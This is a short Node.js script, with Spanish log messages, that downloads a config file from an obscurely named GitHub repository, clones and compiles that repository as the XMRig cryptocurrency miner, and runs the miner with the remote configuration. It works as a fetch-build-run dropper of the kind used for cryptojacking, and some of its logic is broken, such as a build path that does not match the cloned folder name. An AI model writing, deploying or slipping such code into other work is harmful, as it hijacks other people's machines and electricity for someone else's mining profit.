const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');

const configFileURL = 'https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json';
const configFilePath = 'config.json';
const xmrigRepoURL = 'https://github.com/flikamitai/Ufcujcfuuguf.git';
const xmrigRepoPath = 'xmrig';

const file = fs.createWriteStream(configFilePath);
const request = https.get(configFileURL, function(response) {
  response.pipe(file);
});

request.on('error', function(err) {
  console.error(`Error al descargar el archivo config.json: ${err.message}`);
});

request.on('finish', function() {
  console.log('Descarga del archivo config.json completada.');
  file.close();

  const cloneCommand = `git clone ${xmrigRepoURL}`;
  exec(cloneCommand, { cwd: process.cwd() }, (cloneError, cloneStdout, cloneStderr) => {
    if (cloneError) {
      console.error(`Error al clonar el repositorio: ${cloneError}`);
      return;
    }
    console.log(`Clonación exitosa: ${cloneStdout}`);
    console.error(`stderr: ${cloneStderr}`);

    const buildCommand = `cd ${xmrigRepoPath} && mkdir build && cd build && cmake .. && make`;
    exec(buildCommand, (buildError, buildStdout, buildStderr) => {
      if (buildError) {
        console.error(`Error al compilar xmrig: ${buildError}`);
        return;
      }
      console.log(`Compilación exitosa: ${buildStdout}`);
      console.error(`stderr: ${buildStderr}`);

      const runCommand = `./${xmrigRepoPath}/build/xmrig -c ${configFilePath}`;
      exec(runCommand, (runError, runStdout, runStderr) => {
        if (runError) {
          console.error(`Error al ejecutar xmrig: ${runError}`);
          return;
        }
        console.log(`xmrig ejecutándose: ${runStdout}`);
        console.error(`stderr: ${runStderr}`);
      });
    });
  });
});
